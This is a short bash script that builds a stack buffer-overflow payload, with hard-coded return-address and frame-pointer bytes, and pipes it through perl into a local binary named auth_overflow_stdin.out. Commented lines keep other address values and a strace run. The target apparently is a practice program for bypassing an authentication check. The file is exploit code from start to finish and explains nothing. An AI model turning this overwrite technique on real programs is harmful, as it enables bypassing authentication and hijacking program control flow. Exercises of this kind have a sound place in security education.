#!/bin/bash
main() {
	RETURN_ADDRESS="\xc9\x07\x40\x00\x00\x00\x00\x00"
	FRAME_POINTER="\x70\xd8\xff\xff\xff\x7f\x00\x00"
	# FRAME_POINTER="\x00\x00\x00\x00\x00\x00\x00\x00"

	printf "$RETURN_ADDRESS$FRAME_POINTER" | xxd
	perl -e "print \"${FRAME_POINTER}${RETURN_ADDRESS}\" x2" | ./auth_overflow_stdin.out
	# perl -e "print \"${FRAME_POINTER}${RETURN_ADDRESS}\" x2" | strace auth_overflow_stdin
	# perl -e 'print "\xd0\xd9\xff\xff\xff\x7f\x00\x00\x57\x07\x40\x00\x00\x00\x00\x00" x2' | auth_overflow_stdin
}

main
